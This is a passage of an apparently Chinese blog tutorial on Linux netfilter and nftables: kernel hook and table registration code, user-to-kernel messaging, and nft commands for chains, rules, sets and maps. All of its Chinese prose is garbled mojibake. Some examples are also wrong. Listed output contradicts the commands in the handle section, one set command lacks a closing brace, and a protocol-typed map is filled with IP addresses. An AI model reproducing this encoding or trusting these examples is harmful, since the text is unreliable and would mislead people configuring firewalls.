title="function1"><ul><li><p>ä¸Šæ–‡å·²ç»æåˆ°äº†ï¼Œxt_tableçš„æ³¨å†Œåœ¨ <strong>xt_register_table</strong> ä¸­å®Œæˆ</p></li><li><p>hooksçš„æ³¨å†Œåœ¨ <strong>nf_register_net_hooks</strong> ä¸­å®Œæˆ</p><p>åœ¨Netfilterä¸­å·²ç»ä»‹ç»è¿‡äº† <strong>nf_register_net_hook</strong>ï¼Œnf_register_net_hookså…¶å®å°±æ˜¯ä¸€æ¬¡æ³¨å†Œå¤šä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nf_register_net_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>err = nf_register_net_hook(net, &amp;reg[i]);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><span class="hljs-keyword">return</span> err;<br><br>err:<br><span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>)<br>nf_unregister_net_hooks(net, reg, i);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(nf_register_net_hooks);<br></code></pre></td></tr></table></figure></li></ul><h3 id="ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’"><a href="#ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’" class="headerlink" title="ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’"></a>ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨iptableså‘½ä»¤è¡Œè‡ªå®šä¹‰å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬è‡ªå®šä¹‰çš„å‘½ä»¤æ˜¯æ€ä¹ˆä¼ é€’ç»™å†…æ ¸çš„å‘¢(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»*)</p><p><em>ç”¨æˆ·æ€çš„iptablesæºç å¯ä»¥çœ‹å‡ºæ¥</em></p><p><strong>TC_COMMIT</strong> å‡½æ•°åˆ©ç”¨ <strong>setsockopt</strong> å‘å†…æ ¸æäº¤æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">TC_COMMIT</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xtc_handle *handle)</span><br>&#123;<br>    <br>    ret = setsockopt(handle-&gt;sockfd, TC_IPPROTO, SO_SET_REPLACE, repl,<br>             <span class="hljs-keyword">sizeof</span>(*repl) + repl-&gt;size);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>replç±»å‹æ˜¯ <strong>ipt_replace</strong>ï¼Œå¯ä»¥çœ‹å‡ºæ¥å’Œxt_tableç›¸ä¼¼åº¦å¾ˆé«˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> &#123;</span><br><span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_entries;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> __<span class="hljs-title">user</span> *<span class="hljs-title">counters</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entries</span>[0];</span><br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="nftables"><a href="#nftables" class="headerlink" title="nftables"></a>nftables</h1><h2 id="nftablesä½¿ç”¨"><a href="#nftablesä½¿ç”¨" class="headerlink" title="nftablesä½¿ç”¨"></a>nftablesä½¿ç”¨</h2><h3 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add table inet my_table</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªè¡¨ä¸€ä¸ªåœ°å€ç°‡</p><table><thead><tr><th>nftablesç°‡</th><th>iptableså‘½ä»¤è¡Œå·¥å…·</th></tr></thead><tbody><tr><td>ip</td><td>iptables</td></tr><tr><td>ip6</td><td>ip6tables</td></tr><tr><td>inet</td><td>iptableså’Œip6tables</td></tr><tr><td>arp</td><td>arptables</td></tr><tr><td>bridge</td><td>ebtables</td></tr></tbody></table><p>åˆ—å‡ºæ‰€æœ‰è§„åˆ™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºé“¾"><a href="#åˆ›å»ºé“¾" class="headerlink" title="åˆ›å»ºé“¾"></a>åˆ›å»ºé“¾</h3><p>ä¸¤ç§é“¾</p><ul><li><p><strong>å¸¸è§„é“¾</strong>ï¼šä¸éœ€è¦æŒ‡å®šé’©å­ç±»å‹å’Œä¼˜å…ˆçº§ï¼Œå¯ä»¥ç”¨æ¥åšè·³è½¬ï¼Œä»é€»è¾‘ä¸Šå¯¹è§„åˆ™è¿›è¡Œåˆ†ç±»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_utility_chain</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åŸºæœ¬é“¾</strong>ï¼šæ•°æ®åŒ…çš„å…¥å£ç‚¹ï¼Œéœ€è¦æŒ‡å®šé’©å­ç±»å‹å’Œä¼˜å…ˆçº§</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_filter_chain &#123; <span class="hljs-built_in">type</span> filter hook input priority 0 \; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_utility_chain</span><br>table inet my_table &#123;<br>        chain my_utility_chain &#123;<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºè§„åˆ™"><a href="#åˆ›å»ºè§„åˆ™" class="headerlink" title="åˆ›å»ºè§„åˆ™"></a>åˆ›å»ºè§„åˆ™</h3><ul><li><p><strong>add</strong>ï¼šè§„åˆ™æ·»åŠ åˆ°é“¾æœ«å°¾</p></li><li><p><strong>insert</strong>ï¼šè§„åˆ™æ·»åŠ åˆ°é“¾å¤´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain tcp dport ssh accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain tcp dport http accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport ssh accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>index</strong>ï¼šæŒ‡å®šè§„åˆ™index</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain index 1 tcp dport nfs accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>     chain my_filter_chain &#123;<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept<br>             tcp dport nfs accept<br>             tcp dport ssh accept<br>     &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain index 0 tcp dport 1234 accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>     chain my_filter_chain &#123;<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept<br>             tcp dport 1234 accept<br>             tcp dport nfs accept<br>             tcp dport ssh accept<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>handle</strong>ï¼šæŒ‡å®šè§„åˆ™å¥æŸ„</p><ul><li><strong>add</strong> è¡¨ç¤ºæ–°è§„åˆ™æ·»åŠ åœ¨ç´¢å¼•ä½ç½®çš„è§„åˆ™åé¢</li><li><strong>insert</strong> è¡¨ç¤ºæ–°è§„åˆ™æ·»åŠ åœ¨ç´¢å¼•ä½ç½®çš„è§„åˆ™å‰é¢</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>     chain my_filter_chain &#123; # handle 2<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept # handle 4<br>             tcp dport 1234 accept # handle 6<br>             tcp dport nfs accept # handle 5<br>             tcp dport ssh accept # handle 3<br>     &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain handle 4 tcp dport 1234 accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain handle 5 tcp dport nfs accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>     chain my_filter_chain &#123; # handle 2<br>             type filter hook input priority 0; policy accept;<br>             tcp dport http accept # handle 4<br>             tcp dport 2345 accept # handle 8<br>             tcp dport 1234 accept # handle 6<br>             tcp dport 3456 accept # handle 9<br>             tcp dport nfs accept # handle 5<br>             tcp dport ssh accept # handle 3<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="åˆ é™¤è§„åˆ™"><a href="#åˆ é™¤è§„åˆ™" class="headerlink" title="åˆ é™¤è§„åˆ™"></a>åˆ é™¤è§„åˆ™</h3><p>é€šè¿‡handleåˆ é™¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>        chain my_filter_chain &#123; # handle 2<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept # handle 4<br>                tcp dport 2345 accept # handle 8<br>                tcp dport 1234 accept # handle 6<br>                tcp dport 3456 accept # handle 9<br>                tcp dport nfs accept # handle 5<br>                tcp dport ssh accept # handle 3<br>                udp dport 3333 accept # handle 10<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft delete rule inet my_table my_filter_chain handle 8</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft --handle list ruleset</span><br>table inet my_table &#123; # handle 10<br>        chain my_filter_chain &#123; # handle 2<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept # handle 4<br>                tcp dport 1234 accept # handle 6<br>                tcp dport 3456 accept # handle 9<br>                tcp dport nfs accept # handle 5<br>                tcp dport ssh accept # handle 3<br>                udp dport 3333 accept # handle 10<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ—å‡ºè§„åˆ™"><a href="#åˆ—å‡ºè§„åˆ™" class="headerlink" title="åˆ—å‡ºè§„åˆ™"></a>åˆ—å‡ºè§„åˆ™</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list table inet my_table <span class="hljs-comment"># åˆ—å‡ºè¡¨ä¸­è§„åˆ™</span></span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport 1234 accept<br>                tcp dport 3456 accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                udp dport 3333 accept<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_other_chain <span class="hljs-comment"># åˆ—å‡ºé“¾ä¸­è§„åˆ™</span></span><br>table inet my_table &#123;<br>    chain my_other_chain &#123;<br>        udp dport 12345 log prefix &quot;UDP-12345&quot;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h3><ul><li><p><strong>åŒ¿åé›†åˆ</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list ruleset</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>å‘½åé›†åˆ</strong></p><p>æ”¯æŒçš„æ•°æ®ç±»å‹</p><ul><li>ipv4_addrï¼šIPv4 åœ°å€</li><li>ipv6_addrï¼šIPv6 åœ°å€</li><li>ether_addrï¼šä»¥å¤ªç½‘ï¼ˆEthernetï¼‰åœ°å€</li><li>inet_protoï¼šç½‘ç»œåè®®</li><li>inet_serviceï¼šç½‘ç»œæœåŠ¡</li><li>markï¼šæ ‡è®°ç±»å‹</li></ul><p>åˆ›å»ºç©ºçš„å‘½åé›†åˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list sets</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘é›†åˆä¸­æ·»åŠ å…ƒç´ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123; 10.10.10.22, 10.10.10.33 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_set</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>                elements = &#123; 10.10.10.22, 10.10.10.33 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¼•ç”¨é›†åˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain ip saddr @my_set drop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                ip saddr @my_set drop<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>æ”¯æŒåŒºé—´</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_range_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; flags interval</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_range_set &#123; 10.20.20.0/24 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_range_set</span><br>table inet my_table &#123;<br>        set my_range_set &#123;<br>                type ipv4_addr<br>                flags interval<br>                elements = &#123; 10.20.20.0/24 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>çº§è”ä¸åŒç±»å‹</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_concat_set  &#123; <span class="hljs-built_in">type</span> ipv4_addr . inet_proto . inet_service \; &#125;</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_concat_set</span><br>table inet my_table &#123;<br>        set my_concat_set &#123;<br>                type ipv4_addr . inet_proto . inet_service<br>        &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_concat_set &#123; 10.30.30.30 . tcp . telnet &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr . meta l4proto . tcp dport @my_concat_set accept</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr . meta l4proto . udp dport &#123; 10.30.30.30 . udp . bootps &#125; accept</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_tcp_chain</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add chain inet my_table my_udp_chain</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain meta l4proto vmap &#123; tcp : jump my_tcp_chain, udp : jump my_udp_chain &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>    chain my_filter_chain &#123;<br>    ...<br>    meta nfproto ipv4 ip saddr . meta l4proto . udp dport &#123; 10.30.30.30 . udp . bootps &#125; accept<br>    meta l4proto vmap &#123; tcp : jump my_tcp_chain, udp : jump my_udp_chain &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add map inet my_table my_vmap &#123; <span class="hljs-built_in">type</span> inet_proto : verdict \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_vmap &#123; 192.168.0.10 : drop, 192.168.0.11 : accept &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add rule inet my_table my_filter_chain ip saddr vmap @my_vmap</span><br></code></pre></td></tr></table></figure><h2 id="nftablesç›¸å…³æºç "><a href="#nftablesç›¸å…³æºç " class="headerlink" title="nftablesç›¸å…³æºç "></a>nftablesç›¸å…³æºç </h2><p>nftablesä¹Ÿæœ‰å¯¹åº”æ¨¡å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">module_init(nf_tables_module_init);<br>module_exit(nf_tables_module_exit);<br></code></pre></td></tr></table></figure><p>nf_tables_module_initå‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function2.png" class title="function2"><p>ç›¸å…³å˜é‡</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/struct.png" class title="struct"><h3 id="ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’-1"><a href="#ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’-1" class="headerlink" title="ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’"></a>ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æ¶ˆæ¯ä¼ é€’</h3><p>å†…æ ¸æ€å’Œç”¨æˆ·æ€é€šè¿‡ <strong>Netlink</strong> äº¤äº’</p><blockquote><p>Netlinkæ˜¯ä¸€ä¸ªå†…æ ¸æ¥å£ï¼Œä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œä¾¿äºç”¨æˆ·ä¸å†…æ ¸è¿›è¡Œç½‘ç»œä¿¡æ¯äº¤äº’ï¼Œæœ€åˆå¼€å‘æ˜¯ä¸ºäº†å…‹æœioctlçš„é™åˆ¶</p></blockquote><p>ä½¿ç”¨sendtoå‘å†…æ ¸ä¼ é€’æ¶ˆæ¯æ—¶çš„å‡½æ•°è°ƒç”¨æ ˆ</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/stack.png" class title="stack"><p> <strong>nfnetlink_rcv_batch</strong> åˆ©ç”¨ <strong>subsys_id</strong> è·å–nftablesçš„ <strong>nfnetlink_subsystem</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nfnetlink_rcv_batch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> nlmsghdr *nlh,</span><br><span class="hljs-params">u16 subsys_id, u32 genid)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> *<span class="hljs-title">ss</span>;</span><br><span class="hljs-type">const</span> <span 